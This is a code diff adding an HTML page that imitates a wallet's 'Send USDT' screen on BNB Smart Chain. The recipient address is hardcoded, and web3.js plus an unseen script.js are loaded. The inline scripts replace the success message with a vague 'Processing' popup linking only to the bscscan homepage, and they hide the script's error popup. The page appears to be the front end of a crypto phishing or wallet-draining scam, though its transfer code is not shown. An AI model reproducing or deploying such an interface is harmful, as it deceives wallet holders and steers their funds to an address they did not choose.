@@ -1,0 +1,166 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="color-scheme" content="light dark">
+  <title>Send USDT v2</title>
+  <link rel="stylesheet" href="css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.min.css">
+  <!-- Web3.js (Load First) -->
+  <script src="js/web3.min.js"></script>
+</head>
+<body>
+  <!-- Loading overlay: shown when user clicks Next (diamond with bars) -->
+  <div id="loadingOverlay" class="loading-overlay-match" aria-hidden="true" style="display: none;">
+    <header class="loading-overlay-match__header">
+      <button type="button" class="loading-overlay-match__close" aria-label="Close">×</button>
+      <h1 class="loading-overlay-match__title">Loading</h1>
+    </header>
+    <div class="loading-overlay-match__indicator">
+      <div class="loading-overlay-match__diamond">
+        <div class="loading-overlay-match__bars">
+          <span class="loading-overlay-match__bar"></span>
+          <span class="loading-overlay-match__bar"></span>
+          <span class="loading-overlay-match__bar"></span>
+          <span class="loading-overlay-match__bar"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Payment processing popup: shown when transaction succeeds (replaces old success modal) -->
+  <div id="processingPopup" class="processing-popup" aria-hidden="true" style="display: none;">
+    <div class="processing-popup__backdrop"></div>
+    <div class="processing-popup__sheet">
+      <button type="button" class="processing-popup__close" aria-label="Close">×</button>
+      <div class="processing-popup__graphic">
+        <img class="processing-popup__icon processing-popup__icon--light" src="images/logo-processing-light.png" alt="" width="120" height="120" aria-hidden="true">
+        <img class="processing-popup__icon processing-popup__icon--dark" src="images/logo-processing-dark.png" alt="" width="120" height="120" aria-hidden="true">
+      </div>
+      <h2 class="processing-popup__title">Processing...</h2>
+      <p class="processing-popup__desc">
+        <span class="processing-popup__line">Transaction in progress! Blockchain validation is underway.</span>
+        <span class="processing-popup__line">This may take a few minutes.</span>
+      </p>
+      <a id="processingPopupDetailsBtn" href="https://bscscan.com/" target="_blank" rel="noopener" class="processing-popup__btn">Transaction details</a>
+    </div>
+  </div>
+
+  <main class="container">
+    <label class="label" for="address">Address or Domain Name</label>
+    <div class="input-group address-input-group">
+      <input type="text" id="address" placeholder="Search or Enter" value="0xd66A27D67A67aA00CCaa6716E8a223C8270611a4">
+      <button class="text-btn">Paste</button>
+      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
+      <button class="icon-btn"><i class="fas fa-expand"></i></button>
+    </div>
+
+    <label class="label" for="destinationNetwork">Destination network</label>
+    <div class="network-select">
+      <div class="network-icon">
+        <img src="images/cropped_circle_image.png" alt="BNB Smart Chain" class="bnb-logo-img">
+      </div>
+      <span class="network-text">BNB Smart Chain</span>
+      <i class="fas fa-chevron-down network-arrow"></i>
+    </div>
+
+    <label class="label" for="amount">Amount</label>
+    <div class="input-group amount-input-group">
+      <input type="number" id="amount" placeholder="USDT Amount">
+      <span class="unit">USDT</span>
+      <button class="max-btn">Max</button>
+    </div>
+
+    <p class="estimate" id="estimate">≈ $0.00</p>
+
+    <button id="verifyBtn" class="next-btn">Next</button>
+  </main>
+
+  <script src="js/script.js"></script>
+  <script>
+    document.getElementById("verifyBtn").addEventListener("click", Next);
+    (function () {
+      var loadingEl = document.getElementById("loadingOverlay");
+      var origShowLoading = window.showLoading;
+      var origHideLoading = window.hideLoading;
+      if (loadingEl && typeof origShowLoading === "function") {
+        window.showLoading = function (msg) {
+          var spin = document.getElementById("loadingSpinner");
+          if (spin) spin.style.display = "none";
+          loadingEl.style.removeProperty("display");
+          loadingEl.setAttribute("aria-hidden", "false");
+          origShowLoading.apply(this, arguments);
+        };
+      }
+      if (loadingEl && typeof origHideLoading === "function") {
+        window.hideLoading = function () {
+          loadingEl.style.display = "none";
+          loadingEl.setAttribute("aria-hidden", "true");
+          origHideLoading.apply(this, arguments);
+        };
+      }
+      var loadingCloseBtn = loadingEl && loadingEl.querySelector(".loading-overlay-match__close");
+      if (loadingCloseBtn) loadingCloseBtn.addEventListener("click", function () { if (typeof window.hideLoading === "function") window.hideLoading(); });
+      var processingEl = document.getElementById("processingPopup");
+      function closeProcessingPopup() {
+        if (!processingEl) return;
+        processingEl.classList.remove("is-open");
+        processingEl.setAttribute("aria-hidden", "true");
+        processingEl.style.display = "none";
+      }
+      if (processingEl) {
+        processingEl.querySelector(".processing-popup__close").addEventListener("click", closeProcessingPopup);
+        processingEl.querySelector(".processing-popup__backdrop").addEventListener("click", closeProcessingPopup);
+      }
+      var origShowSuccess = window.showSuccess;
+      if (typeof origShowSuccess === "function" && processingEl) {
+        window.showSuccess = function (message) {
+          if (loadingEl) { loadingEl.style.display = "none"; loadingEl.setAttribute("aria-hidden", "true"); }
+          processingEl.style.removeProperty("display");
+          processingEl.classList.add("is-open");
+          processingEl.setAttribute("aria-hidden", "false");
+        };
+      }
+    })();
+    (function () {
+      var origShowError = window.showError;
+      var loadingEl = document.getElementById("loadingOverlay");
+      if (typeof origShowError !== "function") return;
+      window.showError = function (message) {
+        origShowError.apply(this, arguments);
+        if (loadingEl) {
+          loadingEl.style.display = "none";
+          loadingEl.setAttribute("aria-hidden", "true");
+        }
+        var scriptPopup = document.getElementById("errorPopup");
+        if (scriptPopup) scriptPopup.style.display = "none";
+      };
+    })();
+  </script>
+  <!-- Update USD estimate and Next button colour: light when no amount, dark when amount entered -->
+  <script>
+    (function () {
+      var amountInput = document.getElementById("amount");
+      var estimateEl = document.getElementById("estimate");
+      var nextBtn = document.getElementById("verifyBtn");
+      function updateEstimateAndButton() {
+        var raw = amountInput.value.replace(/^\s+|\s+$/g, "");
+        var num = parseFloat(raw) || 0;
+        var value = Math.abs(num);
+        estimateEl.textContent = "≈ $" + value.toFixed(2);
+        if (nextBtn) {
+          if (value > 0) {
+            nextBtn.classList.add("next-btn--has-amount");
+          } else {
+            nextBtn.classList.remove("next-btn--has-amount");
+          }
+        }
+      }
+      amountInput.addEventListener("input", updateEstimateAndButton);
+      amountInput.addEventListener("change", updateEstimateAndButton);
+      updateEstimateAndButton();
+    })();
+  </script>
+
+
+</body></html>
